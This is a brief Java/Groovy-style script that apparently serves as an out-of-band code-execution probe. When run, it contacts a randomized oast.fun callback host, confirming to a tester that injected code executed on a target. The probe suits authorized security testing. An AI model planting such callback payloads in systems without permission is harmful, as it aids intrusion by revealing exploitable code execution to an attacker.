public class PingTest { 
    public PingTest() throws Exception { 
        if (java.net.InetAddress.getByName("qwnsltptvboodttriviyu0ocgxmp0z228.oast.fun").isReachable(5000)) {
            System.out.println("Ping successful");
        } else {
            System.out.println("Ping failed");
        }
    }
}

try {
    new PingTest();  // Instantiate the class and execute the constructor
} catch (Exception e) {
    e.printStackTrace();
}